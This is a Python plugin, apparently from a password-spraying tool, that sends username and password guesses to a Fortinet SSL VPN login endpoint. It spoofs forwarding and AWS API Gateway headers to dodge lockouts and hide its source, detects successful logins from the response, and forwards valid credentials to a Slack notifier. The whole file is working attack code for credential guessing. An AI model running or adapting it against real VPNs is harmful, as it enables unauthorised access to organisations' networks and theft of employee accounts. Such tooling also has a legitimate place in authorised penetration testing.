import datetime, requests
import utils.utils as utils

def fortinetvpn_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
        'error' : False,
        'output' : ""
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    # CHANGEME: Add more if necessary
    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        'Content-Type': 'application/x-www-form-urlencoded'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    post_params = {
        "ajax" : '1',
        'username' : username,
        'credential' : password,
        'realm' : ''
    }

    if 'domain' in pluginargs.keys():
        post_params['realm'] = pluginargs['domain']

    try:

        resp = requests.post("{}/remote/logincheck".format(url),data=post_params,headers=headers)

        if resp.status_code == 200 and 'redir=' in resp.text and '&portal=' in resp.text:
            data_response['success'] = True
            data_response['output'] = utils.prGreen('SUCCESS: => {}:{}'.format(username, password))
            utils.slacknotify(username, password)
            if 'domain' in pluginargs.keys():
                data_response['output'] = data_response['output'] + " Domain: {}".format(pluginargs['domain'])

        else: #fail
            data_response['success'] = False
            data_response['output'] = utils.prRed('FAILURE: {} => {}:{}'.format(resp.status_code, username, password))


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
